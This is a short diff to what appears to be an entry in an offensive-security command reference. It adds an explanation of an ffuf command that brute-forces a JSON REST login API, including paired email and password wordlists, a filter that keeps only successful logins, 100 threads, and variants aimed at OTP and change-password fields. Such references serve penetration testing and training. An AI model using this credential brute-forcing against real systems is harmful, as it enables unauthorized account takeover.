@@ -103,5 +103,6 @@
     "ffuf",
     "credential",
     "json"
-  ]
+  ],
+  "explain": "Brute-forces a JSON REST login endpoint with ffuf's multi-wordlist mode:\n  -w <pwlist>:PASS -w <userlist>:EMAIL   two wordlists bound to the PASS and EMAIL placeholders\n  -u http://<target>/api/v1/authentication/<role>/sign-in   the endpoint\n  -X POST -H \"Content-Type: application/json\"   POST a JSON body\n  -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}'   the body with placeholders substituted\n  -fr \"Invalid Credentials\"   filter out failure responses, keeping only successes\n  -t 100                   100 threads\nThe API-native equivalent of form brute forcing; variations brute a known email, an OTP, or a change-password field."
 }
